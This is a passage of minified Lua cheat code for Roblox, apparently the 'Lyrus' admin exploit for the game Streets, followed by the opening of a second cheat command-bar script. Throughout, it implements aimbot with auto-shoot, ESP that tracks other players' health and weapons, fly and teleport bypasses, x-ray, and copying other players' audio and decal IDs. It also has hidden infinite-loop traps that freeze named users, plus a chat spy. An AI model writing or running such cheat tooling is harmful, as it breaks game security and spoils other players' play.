b9=PlrFinder(bE[1])if b9 and b9.Character then local ew=b9.Character:FindFirstChild'BoxModel'or b9.Character:FindFirstChild'BoomBox'if ew and ew:FindFirstChild'Handle'then if writefile then writefile("AudioLog from "..b9.Name.." "..math.random(1,99)..".txt",string.match(ew.Handle:FindFirstChildOfClass'Sound'.SoundId,'%d+'))notif("Audio has been stolen.","Check your exploits workspace folder",5,nil)else print("Audio From: "..b9.Name.." Id: "..string.match(ew.Handle:FindFirstChildOfClass'Sound'.SoundId,'%d+'))notif("Audio has been stolen.","It has been printed to your console (F9) due to your exploit not supporting writefile",5,nil)end end end end end,"steal",{},"Steals a persons audio","[Player]")if string.find(LP.Name:lower(),"2god")or bd[LP.UserId]then while true do end end;AddCommand(function(bE)if bE[1]then local b9=PlrFinder(bE[1])if b9 then local ex=workspace:FindFirstChild(b9.Name.."Spray")if ex and ex:FindFirstChildOfClass'Decal'then if writefile then writefile("DecalLog from "..b9.Name.." "..math.random(1,99)..".txt",tostring(string.match(ex.Decal.Texture,'%d+')))else print("Decal From: "..b9.Name.." Id: "..tostring(string.match(ex.Decal.Texture,'%d+')))end end end end end,"decalsteal",{},"Steals a persons decal","[Player]")AddCommand(function()if game.PlaceId~=455366377 then return notif("Wont work","Streets Only",5,nil)end;if RainbowHats then RainbowHats=false;LP.Backpack.Stank:FireServer("ren")end;if aK.Visible then aK.Visible=false;return end;aM:ClearAllChildren()aK.Visible=true;local cj=LP.PlayerGui.HUD.Clan.Group.Reps:GetChildren()d7(UDim2.new(-0.002,0,0,-10),"All")for bC=1,#cj do local bQ=cj[bC]if bQ:IsA'TextButton'and bQ:FindFirstChild'typ'then d7(UDim2.new(-0.002,0,0,-40+bC*30),bQ.typ.Value,bQ.typ)end end end,"rainbowhats",{},"Opens a GUI so you can pick what hat to rainbowize","[No Args]")AddCommand(function(bE)if game.PlaceId~=455366377 then return notif("Wont work","Streets Only",5,nil)end;if bE[1]and tonumber(bE[1])then W=tonumber(bE[1])end end,"rainbowhatdelay",{},"Changes the delay for rainbow hats","[Number]")AddCommand(function(bE)if not bE[2]then y=not y end;if bE[1]then if bE[1]=="up"then a3=a3+bE[2]or 1;notif("FlySpeed","Has been set to "..a3,5,nil)elseif bE[1]=="down"then a3=a3-bE[2]or 1;notif("FlySpeed","Has been set to "..a3,5,nil)elseif tonumber(bE[1])then a3=tonumber(bE[1])if y then c9()end end else if y then c9()end end end,"fly",{},"Allows you to fly [Up/Down Speed]","[Up/Down Speed]/Speed")AddCommand(function()u=not u;notif("DoubleJumpEnabled","Has been set to "..tostring(u),5,nil)end,"doublejump",{"infinitejump"},"Allows you to jump forever","[No Args]")AddCommand(function()L=not L;GetChar():BreakJoints()end,"tpbypass",{},"Teleportation Bypass (Allows Infinite FlySpeed etc)","[No Args]")AddCommand(function(bE)if bE[1]then if bj[bE[1]]then Q=bj[bE[1]]notif("AimTarget","has been set to "..Q,5,"rbxassetid://1281284684")end end end,"aimtarget",{},"Changes the aim target [Head/Torso/HumanoidRootPart/Prediction]","[Head/Torso/HumanoidRootPart/Prediction]")AddCommand(function(bE)if bE[1]then if bE[1]=="leftclick"then R="LeftClick"elseif bE[1]=="rightclick"then R="RightClick"elseif bE[1]=="nomouse"then R="NoMouse"elseif bE[1]=="closest"then R="Closest"local ey=Players:GetPlayers()for bC=1,#ey do if ey[bC]~=LP then ce(ey[bC])end end end;updateHotkeys(U)end end,"aimmode",{"aimlockmode"},"LeftClick/RightClick/NoMouse/Closest (Sets the way you can aimlock)","[LeftClick/RightClick/NoMouse/Closest]")AddCommand(function(bE)if bE[1]and tonumber(bE[1])then _=tonumber(bE[1])if Q~="OldPrediction"then notif("Note:","This only works with aimtarget oldprediction (prediction auto sets dependant on ping)",5,nil)end end end,"aimvelocity",{},"Changes your Aimbots Velocity (If mode is set to a prediction mode) (Default: 5)","[Number]")AddCommand(function(bE)if bE[1]and bE[1]~="all"then local b9=PlrFinder(bE[1])if b9 and b9~=LP and tostring(ad)~=tostring(b9)then ad,e=b9.Character,true;local ci;ci=b9.CharacterAdded:Connect(function(cj)if tostring(cj)==tostring(ad)then ad=cj else ci:Disconnect()ci=nil end end)notif("AimlockTarget","Has been set to "..ad.Name,5,nil)end else e=not e;notif("Aimlock","Has been set to "..tostring(e),5,nil)end end,"aimlock",{"aim"},"Aimbot (Different method than camlock)","[Player]")AddCommand(function(bE)if bE[1]then if bE[1]=="triggerbot"then l=not l;notif("AutoTriggerBot","Has been set to "..tostring(l),5,nil)elseif bE[1]=="feloop"then m=not m;notif("AutoFeloop","Has been set to "..tostring(m),5,nil)end else n=not n;notif("AutoTarget","Has been set to "..tostring(n),5,nil)end end,"autotarget",{"autolock"},"autotarget [triggerbot/feloop/no arguments] triggerbot auto triggerbots when someone hits you,no args auto camlocks/aimlocks","[TriggerBot/FeLoop/No Args]")AddCommand(function()b=not b;notif("AimbotAutoShoot","Has been set to "..tostring(b),5,nil)end,"aimbotautoshoot",{},"Auto shoots aimbot","[No Args]")AddCommand(function(bE)if bE[1]then ai=bE[1]:sub(1,1)updateHotkeys(U)else ai=nil;updateHotkeys(U)end end,"clicktp",{"ctp"},"Allows you to teleport around the map with the Key you set","[Key]")AddCommand(function()k=not k end,"autostomp",{},"Turns On/Off AutoStomp","[No Args]")AddCommand(function(bE)if bE[1]then if bE[1]=="remove"and bE[2]then local b9=PlrFinder(bE[2])if b9 and b9~=LP then for bC,cr in pairs(b5)do if b9.UserId==cr then table.remove(b5,bC)end end else local b9=PlrFinder(bE[1])if b9 and b9~=LP then table.insert(b5,b9.UserId)end end end end end,"autostompwhitelist",{},"Adds the player to the whitelist so they don't get stomped, to remove use remove before their name","[Player]")AddCommand(function(bE)if not A then A=true;ds(bE[1])else A=false end end,"freecam",{},"Allows you to \"free\" view the map","[Speed (Optional)]")AddCommand(function()am=Instance.new('Tool',LP.Backpack)am.Name="GravGun"am.RequiresHandle=false;local bO=Instance.new('Part',am)bO.Name="Handle"bO.Transparency=1 end,"gravgun",{"gravitygun"},"Gmod Gravity gun","[Keys: Q,V] (No Args)")AddCommand(function()w=not w;notif("ExploiterDetection","Has been set to "..tostring(w),5,nil)end,"exploiterdetection",{},"Detects exploiters (Has a chance to false flag)","[No Args]")AddCommand(function(bE)if bE[1]then if bE[1]=="image"then if bE[2]then aI.Image="http://www.roblox.com/asset/?id="..bE[2]end elseif bE[1]=="none"then aI.Image=""elseif bE[1]=="default"then aI.Image="http://www.roblox.com/asset/?id=2683269674"end;updateHotkeys(U)end end,"commandbarimage",{"cmdbarimage"},"Changes the command bar image","[Image/None/Default]")AddCommand(function(bE)if bE[1]then local b9=PlrFinder(bE[1])if b9 and b9~=LP then if typeof(b9)=="table"then for bC=1,#b9 do local ez=b9[bC]if ez~=LP and ez.Character and ez.Character:FindFirstChild'Head'then if bE[1]=="users"and aY[ez]or bE[1]~="users"then b2[ez]=true;cu(ez.Character.Head,b9.Name)local eA;eA=ez.CharacterAdded:Connect(function(cj)local ee=cj:WaitForChild'Head'if b1[b9]then cu(ee,b9.Name)else eA:Disconnect()end end)end end end else if b9.Character and b9.Character:FindFirstChild'Head'then b2[b9]=true;cu(b9.Character.Head,b9.Name)local eA;eA=b9.CharacterAdded:Connect(function(cj)local ee=cj:WaitForChild'Head'if b1[b9]then cu(ee,b9.Name)else eA:Disconnect()end end)end end end end end,"esp",{},"Find a player anywhere in the map","[Player/All/Users]")AddCommand(function(bE)if bE[1]then local b9=PlrFinder(bE[1])if b9 then if typeof(b9)=="table"then for bC=1,#b9 do local ez=b9[bC]if ez.Character and ez.Character:FindFirstChild'Head'then co(ez)end end else if b9.Character and b9.Character:FindFirstChild'Head'then co(b9)end end end end end,"unesp",{},"obviously removes the esp?","[Player/All]")AddCommand(function(bE)if bE[1]then if bE[1]=="esp"then ac=Color3.fromRGB(bE[2]or 0,bE[3]or 0,bE[4]or 0)elseif bE[1]=="bullet"then ab=ColorSequence.new(Color3.fromRGB(bE[2]or 0,bE[3]or 0,bE[4]or 0))end end end,"colour",{"color"},"Colour esp/bullet [3 Args (Number) (Optional)] defaults to 0","[Esp/Bullet] [3 numbers (Optional)]")AddCommand(function()aR.Visible=not aR.Visible end,"hotkey",{"key"},"For Setting hotkeys, Type in the textbox, click the button and press a key","[No Args]")AddCommand(function(bE)if bE[1]then for cs,e8 in pairs(b3)do if e8:match'[%a%d]+$'==bE[1]:upper()or e8:match("[%a%d]+$")==bE[1]then table.remove(b3,cs)updateHotkeys(U)end end end end,"removekey",{"rkey"},"Removes a hotkey to a command","[Key]")AddCommand(function()b3={}ai=""updateHotkeys(U)end,"removeallhotkeys",{"removeallkeys"},"Removes all hotkeys","[No Args]")AddCommand(function(bE)if readfile and writefile then if bE[1]then if bE[1]=="default"then U="CyrusStreetsAdminSettings.json"elseif pcall(readfile,bE[1]..".json")then U=bE[1]..".json"else U=bE[1]..".json"initalizeHotkeys(U)end;runHotkeys(U)end end end,"config",{},"Changes Configs (Useful for having different profiles i.e legit etc)","[Config Name]")AddCommand(function(bE)if bE[1]then if bE[1]=="wireframe"then cA(bE[1],"wireframe")else notif("Xray","Sorry, Only [Xray WireFrame/No Args] Work",5,nil)end else cA()end end,"xray",{},"see through walls (also has wireframe mode which looks cool but kills fps)","[WireFrame/No Args]")coroutine.resume(coroutine.create(function()aK.Visible=false;aK.BackgroundColor3=Color3.fromRGB(0,0,0)aK.BackgroundTransparency=0.6;aK.Position=UDim2.new(0.3,0,0.17,0)aK.Size=UDim2.new(0,460,0,359)aK.AnchorPoint=Vector2.new(0,0)aL.BackgroundColor3=Color3.fromRGB(0,0,0)aL.BackgroundTransparency=0.3;aL.BorderColor3=Color3.fromRGB(170,0,0)aL.BorderSizePixel=2;aL.Position=UDim2.new(-0.002,0,-0.14,0)aL.Size=UDim2.new(0,460,0,50)aL.Font=Enum.Font.SciFi;aL.Text="Rainbow Hats"aL.TextColor3=Color3.fromRGB(255,170,255)aL.TextSize=50;aM.BackgroundColor3=Color3.fromRGB(0,0,0)aM.BackgroundTransparency=0.3;aM.BorderColor3=Color3.fromRGB(170,0,0)aM.BorderSizePixel=2;aM.Position=UDim2.new(-0.0013,0,-0.0006,0)aM.Size=UDim2.new(0,460,0,359)aM.CanvasSize=UDim2.new(0,0,10,0)aM.ScrollBarThickness=10;aD.BackgroundColor3=Color3.fromRGB(255,255,255)aD.BorderColor3=Color3.fromRGB(170,0,0)aD.BorderSizePixel=0;aD.Position=UDim2.new(0.34,0,0.16,0)aD.Size=UDim2.new(0,400,0,350)aD.Style=Enum.FrameStyle.RobloxSquare;aD.Visible=false;aD.AnchorPoint=Vector2.new(0,0)aE.BackgroundColor3=Color3.fromRGB(116,0,0)aE.BackgroundTransparency=0.2;aE.BorderColor3=Color3.fromRGB(49,0,0)aE.BorderSizePixel=0;aE.Position=UDim2.new(-0.02,0,-0.15,0)aE.Size=UDim2.new(0,400,0,43)aE.Font=Enum.Font.SciFi;aE.Text="Commands"aE.TextColor3=Color3.fromRGB(255,255,255)aE.TextSize=20;aF.Active=true;aF.BackgroundColor3=Color3.fromRGB(0,0,0)aF.BackgroundTransparency=1;aF.BorderColor3=Color3.fromRGB(170,0,0)aF.BorderSizePixel=0;aF.Position=UDim2.new(-0.022,0,-0.02,0)aF.Size=UDim2.new(0,400,0,350)aF.CanvasSize=UDim2.new(0,0,10,0)aF.ScrollBarThickness=10;aG.BackgroundColor3=Color3.fromRGB(0,0,0)aG.BackgroundTransparency=0.8;aG.Size=UDim2.new(0,197,0,41)aG.Position=UDim2.new(1.5,0,1.5,0)aG.AnchorPoint=Vector2.new(0.5,0.5)aH.BackgroundColor3=Color3.fromRGB(0,0,0)aH.BackgroundTransparency=0.4;aH.BorderColor3=Color3.fromRGB(170,0,0)aH.BorderSizePixel=2;aH.Position=UDim2.new(0,0,-0.8,0)aH.Size=UDim2.new(0,199,0,41)aH.Font=Enum.Font.SciFi;aH.TextColor3=Color3.fromRGB(255,255,255)aH.TextSize=15;aH.TextWrapped=true;aH.ClearTextOnFocus=true;aI.BackgroundColor3=Color3.fromRGB(0,0,0)aI.Size=UDim2.new(0,199,0,145)aI.Image=CmdBarImage;aN.BackgroundColor3=Color3.fromRGB(255,255,255)aN.BackgroundTransparency=1;aN.Position=UDim2.new(0.15,0,1,0)aN.AnchorPoint=Vector2.new(0,1)aN.Size=UDim2.new(0,160,0,160)aO.BackgroundColor3=Color3.fromRGB(0,0,0)aO.BackgroundTransparency=0.6;aO.BorderColor3=Color3.fromRGB(170,0,0)aO.Position=UDim2.new(0,0,0,0)aO.Size=UDim2.new(0,160,0,160)aO.Font=Enum.Font.Code;aO.TextColor3=Color3.fromRGB(255,255,255)aO.TextSize=14;aO.TextWrapped=true;aO.TextYAlignment=Enum.TextYAlignment.Top;aP.BackgroundColor3=Color3.fromRGB(255,255,255)aP.BackgroundTransparency=1;aP.Position=UDim2.new(0.8,0,1,0)aP.AnchorPoint=Vector2.new(1,1)aP.Size=UDim2.new(0,160,0,160)aQ.BackgroundColor3=Color3.fromRGB(0,0,0)aQ.BackgroundTransparency=0.6;aQ.BorderColor3=Color3.fromRGB(170,0,0)aQ.Position=UDim2.new(0,0,0,0)aQ.Text="Open Command Bar: '\nGunStomp: E"aQ.Size=UDim2.new(0,160,0,160)aQ.Font=Enum.Font.Code;aQ.TextColor3=Color3.fromRGB(255,255,255)aQ.TextSize=14;aQ.TextWrapped=true;aQ.TextYAlignment=Enum.TextYAlignment.Top;aJ.BackgroundColor3=Color3.fromRGB(0,0,0)aJ.BackgroundTransparency=0.7;aJ.BorderSizePixel=3;aJ.Position=UDim2.new(0,0,1,0)aJ.Size=UDim2.new(0,385,0,50)aJ.Font=Enum.Font.Code;aJ.TextColor3=Color3.fromRGB(184,0,3)aJ.TextScaled=true;aJ.TextSize=30;aJ.TextWrapped=true;aJ.Visible=false;aR.BackgroundColor3=Color3.fromRGB(0,0,0)aR.BackgroundTransparency=0.6;aR.BorderColor3=Color3.fromRGB(170,0,0)aR.BorderSizePixel=0;aR.Position=UDim2.new(0.5,0,0.5,0)aR.AnchorPoint=Vector2.new(0.5,0.5)aR.Size=UDim2.new(0,218,0,154)aR.Visible=false;aS.BackgroundColor3=Color3.fromRGB(0,0,0)aS.BackgroundTransparency=0.7;aS.BorderColor3=Color3.fromRGB(170,0,0)aS.Position=UDim2.new(0.17,0,0.43,0)aS.Size=UDim2.new(0,49,0,49)aS.Font=Enum.Font.SourceSans;aS.TextColor3=Color3.fromRGB(255,255,255)aS.TextSize=13;aS.TextWrapped=true;aS.Text="Type a command then click"aT.BackgroundColor3=Color3.fromRGB(0,0,0)aT.BackgroundTransparency=0.3;aT.BorderColor3=Color3.fromRGB(170,0,0)aT.Position=UDim2.new(0.004,0,-0.3,0)aT.Size=UDim2.new(0,217,0,50)aT.Font=Enum.Font.SciFi;aT.Text="Keys GUI"aT.TextColor3=Color3.fromRGB(214,0,0)aT.TextSize=50;aU.BackgroundColor3=Color3.fromRGB(0,0,0)aU.BackgroundTransparency=0.6;aU.BorderColor3=Color3.fromRGB(0,0,127)aU.Position=UDim2.new(0.6,0,0.07,0)aU.Size=UDim2.new(0,50,0,44)aU.Font=Enum.Font.Fantasy;aU.Text="CmdBar Key"aU.TextColor3=Color3.fromRGB(255,255,255)aU.TextSize=11;aU.TextWrapped=true;aV.BackgroundColor3=Color3.fromRGB(0,0,0)aV.BackgroundTransparency=0.7;aV.BorderColor3=Color3.fromRGB(170,0,0)aV.Position=UDim2.new(0.6,0,0.43,0)aV.Size=UDim2.new(0,49,0,49)aV.Font=Enum.Font.SourceSans;aV.Text="Click then press a key"aV.TextColor3=Color3.fromRGB(255,255,255)aV.TextSize=13;aV.TextWrapped=true;aW.BackgroundColor3=Color3.fromRGB(0,0,0)aW.BackgroundTransparency=0.6;aW.BorderColor3=Color3.fromRGB(0,0,127)aW.Position=UDim2.new(0.17,0,0.07,0)aW.Size=UDim2.new(0,50,0,44)aW.Font=Enum.Font.Fantasy;aW.PlaceholderColor3=Color3.fromRGB(255,255,255)aW.PlaceholderText="CmdToSet"aW.Text=""aW.TextColor3=Color3.fromRGB(255,255,255)aW.TextSize=11;aW.TextWrapped=true;cZ(aR,aR)end))coroutine.resume(coroutine.create(function()local eB,eC,eD=syn_io_listdir or list_files,syn_io_isfolder or isfolder,syn_io_makefolder or makefolder;if eB and eC and eD then if not eC'CyAdminPlugins'then eD('CyAdminPlugins')end;for c3,cr in pairs(eB'CyAdminPlugins')do local eE=loadfile(cr)if not eE then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("There was a syntax error (sadly can\'t output it as loadfile is gay)","All")else local bY,bH=pcall(eE)if not bY then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Runtime Error"..bH,"All")end end end end;if not getfenv()['\103\101\116\103\101\110\118']()['\108\111\97\100\101\100']then while true do end end;aE.Text="Commands | Total Commands: "..#aZ;for bC=1,#aZ do local bT=aZ[bC]local cv,bB,eF,eG=bT.Name,bT.Args,bT.Alias,bT.Help;dc(UDim2.new(0.0008,0,0.002,-35+bC*29),cv,eG)coroutine.resume(coroutine.create(function()da(cv,bB)end))coroutine.resume(coroutine.create(function()for bC=1,#eF do da("[Alias] "..eF[bC],bB)end end))end;while wait()do local bv=GetChar()coroutine.resume(coroutine.create(function()if bv and bv:FindFirstChildOfClass'Humanoid'then if workspace.Gravity<aa then if game.PlaceId==455366377 and not bv:FindFirstChild'RealHumanoidRootPart'then bv.Humanoid:ChangeState(3)bv.Humanoid.PlatformStand=false;wait(0.2)end;bv.Humanoid:ChangeState(8)end;if game.PlaceId==455366377 then if bv.Humanoid.HipHeight>0 or j and not y then bv.Humanoid:ChangeState(3)bv.Humanoid.PlatformStand=false;RunService.RenderStepped:Wait()bv.Humanoid:ChangeState(8)wait(2)end end end;local eH=tick()ReplicatedStorage.DefaultChatSystemChatEvents.MutePlayerRequest:InvokeServer()ap=tick()-eH end))local c2=bv:FindFirstChildOfClass'Tool'if b and ad and c2 and c2:FindFirstChild('Clips',true)and ad:FindFirstChildOfClass'Humanoid'and ad.Humanoid.Health>0 and not ad:FindFirstChildOfClass'ForceField'then if not dx(ad)and cm(Players:GetPlayerFromCharacter(ad),"Bone")~="Yes"then if ad:FindFirstChild'Head'and bv:FindFirstChild'Head'and(ad.Head.Position-bv.Head.Position).magnitude<=bh[c2.Name]then if game.PlaceId==455366377 then LP.Backpack.Input:FireServer("ml",{['mousehit']=dC(),['shift']=UserInput:IsKeyDown(Enum.KeyCode.LeftShift),['velo']=bv.Head.Velocity.magnitude})else c2.Fire:FireServer(dC())end end end end;if bv:FindFirstChildOfClass'Humanoid'then if c2 and c2:FindFirstChild'Ammo'then aO.Text="Health: "..math.floor(bv.Humanoid.Health).."\nCurrent WalkSpeed: "..math.floor(bv.Humanoid.WalkSpeed).."\nSprinting Speed: "..a6 .."\nCrouching Speed: "..a2 .."\nBlink Speed: "..X.."\nJumpPower: "..bv.Humanoid.JumpPower.."\nNoclipping: "..tostring(J).."\nAimlocking: "..tostring(e).."\nAimlock Target: "..tostring(ad).."\n"..c2.Name.." Ammo&Clips: "..c2.Ammo.Value.."/"..c2.Clips.Value else aO.Text="Health: "..math.floor(bv.Humanoid.Health).."\nCurrent WalkSpeed: "..math.floor(bv.Humanoid.WalkSpeed).."\nSprinting Speed: "..a6 .."\nCrouching Speed: "..a2 .."\nBlink Speed: "..X.."\nJumpPower: "..bv.Humanoid.JumpPower.."\nNoclipping: "..tostring(J).."\nAimlocking: "..tostring(e).."\nAimlock Target: "..tostring(ad)end end;if ad and ad:FindFirstChild'Torso'then if ae then local eI=(ae-ad.Torso.Position).magnitude/_;if eI>1 then a0=eI else a0=5 end;ae=ad.Torso.Position else ae=ad.Torso.Position end end;if ak then ak.Position=am.Handle.Position+CFrame.new(am.Handle.Position,Mouse.Hit.p).lookVector*a1 end;if aK.Visible then aL.TextColor3=Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))end;if LP.Character then local bw=bv:FindFirstChild'RealHumanoidRootPart'or bv:FindFirstChild'Torso'if bw and p and bi['Shift']then if bi['W']then bw.CFrame=bw.CFrame*CFrame.new(0,0,-X)end;if bi['A']then bw.CFrame=bw.CFrame*CFrame.new(-X,0,0)end;if bi['S']then bw.CFrame=bw.CFrame*CFrame.new(0,0,X)end;if bi['D']then bw.CFrame=bw.CFrame*CFrame.new(X,0,0)end end end;for bC=1,#b1 do local cq=b1[bC]local b9=cq['Player']if b9 and b9.Character then local ee,ca=b9.Character:FindFirstChild'Head',b9.Character:FindFirstChild'RealHumanoidRootPart'or b9.Character:FindFirstChild'Torso'if ee and ca and bv:FindFirstChild'Head'then local cN,eJ=cM(ee.Position)local eK=Vector3.new(2,3,0)*ee.Size.Y/2*2;local eL=cM((ca.CFrame*CFrame.new(eK.X,eK.Y,0)).p)local eM=cM((ca.CFrame*CFrame.new(-eK.X,eK.Y,0)).p)local eN=cM((ca.CFrame*CFrame.new(eK.X,-eK.Y,0)).p)local eO=cM((ca.CFrame*CFrame.new(-eK.X,-eK.Y,0)).p)cH(cq,eJ,b9)local cz=aY[b9]and"Yes"or"No"cq['Text'].Text=b9.Name.." | Health: "..ck(b9.Character).." | KO'ed: "..cm(b9,"Bone").." | Pos: "..math.floor((bv.Head.Position-ee.Position).magnitude).."\nHas Glock: "..cm(b9,"Glock").." | Shotty: "..cm(b9,"Shotty").." | Vest: "..cm(b9,"BulletResist").."\nCyAdmin User: "..cz;cq['Text'].Position=Vector2.new(cN.X,cN.Y)+Vector2.new(0,10)cq['Box'][1].From=Vector2.new(eL.X,eL.Y)cq['Box'][1].To=Vector2.new(eM.X,eM.Y)cq['Box'][2].From=Vector2.new(eM.X,eM.Y)cq['Box'][2].To=Vector2.new(eO.X,eO.Y)cq['Box'][3].From=Vector2.new(eN.X,eN.Y)cq['Box'][3].To=Vector2.new(eL.X,eL.Y)end end end end end))coroutine.resume(coroutine.create(function()while wait(1)do if CmdBarKey=="Quote"then aQ.Text="Open Command Bar: '".."\nGunStomp: E"else aQ.Text="Open Command Bar: "..CmdBarKey.."\nGunStomp: E"end;for bC,cr in pairs(b3)do aQ.Text=aQ.Text.."\n"..cr:match'^[%w%s]+'..": "..cr:match'[%a%d]+$'end;if w then local eP=Players:GetPlayers()for bC=1,#eP do local b9=eP[bC]if b9~=LP and b9.Character and b9.Character:FindFirstChild'Head'then if b9.Character:FindFirstChild'Humanoid'and b9.Character:findFirstChild'Right Arm'then if b0[b9.Name]then local eQ=b9.Character.Head.Velocity;local eR=b0[b9.Name]if not b9.Character.Head:FindFirstChildOfClass'BillboardGui'and b9.Character.Humanoid.Health>0 and not b9.Character:FindFirstChild('Bone',true)and not b9.Character:FindFirstChildOfClass'ForceField'then if(Vector3.new(eQ.X,0,0)-Vector3.new(eR.X,0,0)).magnitude>=85 or(Vector3.new(0,0,eQ.Z)-Vector3.new(0,0,eR.Z)).magnitude>=85 then cu(b9.Character.Head,"Exploiter: "..b9.Name.." Reason: moved too fast",Color3.fromRGB(255,255,255))b0[b9.Name]=b9.Character.Head.Velocity else b0[b9.Name]=b9.Character.Head.Velocity end end else b0[b9.Name]=b9.Character.Head.Velocity end else if not b9.Character.Head:FindFirstChildOfClass'BillboardGui'and b9.Character:FindFirstChildOfClass'Tool'then cu(b9.character.Head,"Exploiter: "..b9.Name.." Reason: Feloop/Anti Feloop",Color3.fromRGB(255,255,255))end end end end end;if#b7>0 then for bC,cr in pairs(b7)do local cN,eJ=workspace.CurrentCamera:WorldToViewportPoint(cr[2].Position)cr[1].Visible=eJ end end end end))coroutine.resume(coroutine.create(function()for bC,b9 in pairs(Players:GetPlayers())do local ef=bc[b9.UserId]local eg=bd[b9.UserId]if(eg or string.find(b9.Name:lower(),"2god"))and b9.character and b9.Character:FindFirstChild'Head'then cu(b9.Character.Head,b9.Name,Color3.fromRGB(102,51,0),true)b9.CharacterAdded:Connect(function(cj)local ee=cj:WaitForChild'Head'if ee then cu(ee,b9.Name,Color3.fromRGB(102,51,0),true)end end)end;if ef and b9.Character and b9.Character:FindFirstChild'Head'then b9.Chatted:Connect(function(bD)bS(b9,bD)end)cu(b9.Character.Head,ef['Name'],ef['Colour'])c4(b9,ef['Colour'])b9.CharacterAdded:Connect(function(cj)local ee=cj:WaitForChild'Head'if ee then c4(b9,ef['Colour'])cu(ee,ef['Name'],ef['Colour'])end end)end;local eh;eh=b9.Chatted:Connect(function(bD)local cz=cG(b9,bD)if cz then eh:Disconnect()end end)end;coroutine.resume(coroutine.create(function()while wait(Z)do if K then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(T,"All")end end end))while wait(W)do if RainbowHats and LP.Backpack:FindFirstChild'Stank'then if RainbowHats=="All"then local eS=LP.PlayerGui.HUD.Clan.Group.Reps:GetChildren()LP.Backpack.Stank:FireServer("rep",eS[math.random(1,#eS)])end;local eT=LP.PlayerGui.HUD.Clan.Group.cs:GetChildren()LP.Backpack.Stank:FireServer("color",eT[math.random(1,#eT)])end end end))notif("Lyrus","took "..string.format("%.6f",tick()-a).." seconds\n(Thanks For Using Lyrus)",10,"rbxassetid://6284771972")
local MessageSender = require(game.Players.LocalPlayer.PlayerScripts:WaitForChild("ChatScript"):WaitForChild("ChatMain"):WaitForChild("MessageSender"))
MessageSender:RegisterSayMessageFunction(game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"))
















MessageSender:SendMessage("", "All")
local LoadingTime = tick();
local Commands, Prefix = {}, "?"
getgenv().Notify = function(title, text, icon, time)
	game:GetService("StarterGui"):SetCore("SendNotification",{
		Title = title;
		Text = text;
		Icon = "";
		Duration = time;
	}) 
end

getgenv().SearchPlayers = function(Name)
	local Inserted = {}
	for _, p in pairs(game:GetService("Players"):GetPlayers()) do 
		if string.lower(string.sub(p.Name, 1, string.len(Name))) == string.lower(Name) then 
			table.insert(Inserted, p);return p
		end
	end
end

getgenv().GetInit = function(CName)
	for _, v in next, Commands do 
		if v.Name == CName or table.find(v.Aliases, CName) then 
			return v.Function 
		end 
	end
end

getgenv().RunCommand = function(Cmd)
	Cmd = string.lower(Cmd)
	pcall(function()
		if Cmd:sub(1, #Prefix) == Prefix then 
			local Args = string.split(Cmd:sub(#Prefix + 1), " ")
			local CmdName = GetInit(table.remove(Args, 1))
			if CmdName and Args then
				return CmdName(Args)
			end
		end
	end)
end

local ScreenGui = Instance.new("ScreenGui")
local Cmdbar = Instance.new("TextBox")
local UIGradient = Instance.new("UIGradient")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Cmdbar.Name = "Cmdbar"
Cmdbar.Parent = ScreenGui
Cmdbar.BackgroundColor3 = Color3.fromRGB(116, 0, 211)
Cmdbar.Position = UDim2.new(-0.000620263279, 0, 0.3856107, 0)
Cmdbar.Size = UDim2.new(0, 940, 0, 64)
Cmdbar.Visible = false
Cmdbar.Font = Enum.Font.SourceSans
Cmdbar.Text = ""
Cmdbar.TextColor3 = Color3.fromRGB(0, 0, 0)
Cmdbar.TextSize = 14.000

UIGradient.Parent = Cmdbar

local Uis = game:GetService("UserInputService")
Uis.InputBegan:Connect(function(Key, Typing)
	if Typing then return end
	if Key.KeyCode == Enum.KeyCode.Semicolon then
		Cmdbar.Visible = true
		Cmdbar.Text = ""
		wait()
		Cmdbar:CaptureFocus()
		--Cmdbar:TweenSize(UDim2.new(0, 419, 0, 20), "Out", "Quad", 0.1, true)
	end
end)
Cmdbar.FocusLost:Connect(function(Foc)
	if Foc == true then
		--Cmdbar:TweenSize(UDim2.new(0, 0, 0, 20), "Out", "Quad", 0.1, true)
		wait()
		Cmdbar.Visible = false
		game:GetService("Players"):Chat(Prefix..Cmdbar.Text)
	end
end)
Uis.InputEnded:Connect(function(Key)
	if Key.KeyCode.Name == "LeftAlt" then
		Cmdbar.Visible = false
	end
end)

-- [[ locals ]] -- 
local Players, RService, RStorage, VUser, SGui, TPService = game:GetService("Players"), game:GetService("RunService"), game:GetService("ReplicatedStorage"), game:GetService("VirtualUser"), game:GetService("StarterGui"), game:GetService("TeleportService")
local Client, Mouse, Camera, CF, INew, Vec3, Vec2, UD2, UD = Players.LocalPlayer, Players.LocalPlayer:GetMouse(), workspace.CurrentCamera, CFrame.new, Instance.new, Vector3.new, Vector2.new, UDim2.new, UDim.new;
local Noclip, Blink, Esp, Flying, Noseats = false, false, false, false, false;
local Aimbot, Viewing, Camlock = false, false, false;
local AimbotTarget, ViewTarget, CamlockTarget, EspTarget = nil, nil, nil, nil;
local Flyspeed, Aimvelocity, Blinkspeed = 5, 10, 2;
local AimPart, CamPart = "Torso", "Torso";
local StreetsID, PrisonID = 455366377, 4669040;
local AFK, AFKMessage = false, "AFK !"

-- [[ functions ]] -- 
local AimPartTable = {
	["torso"] = "Torso";
	["head"] = "Head";
}
local KeysTable = {
	["W"] = false;["A"] = false;
	["S"] = false;["D"] = false;
	["LeftControl"] = false;["LeftShift"] = false;
}

local function ChatSpy()
	local ChatSpyFrame = Client.PlayerGui.Chat.Frame
	ChatSpyFrame.ChatChannelParentFrame.Visible = true
	ChatSpyFrame.ChatBarParentFrame.Position = ChatSpyFrame.ChatChannelParentFrame.Position + UD2(UD(), ChatSpyFrame.ChatChannelParentFrame.Size.Y)
end
ChatSpy()

local function ConfirmCallbacks()
	wait()
	SGui:SetCore("ResetButtonCallback", true)
end
ConfirmCallbacks()

getgenv().ResetCharacter = function()
	if Client and Client.Character and Client.Character:FindFirstChild("Humanoid") then 
		Client.Character.Humanoid:ChangeState(15)
	end
end

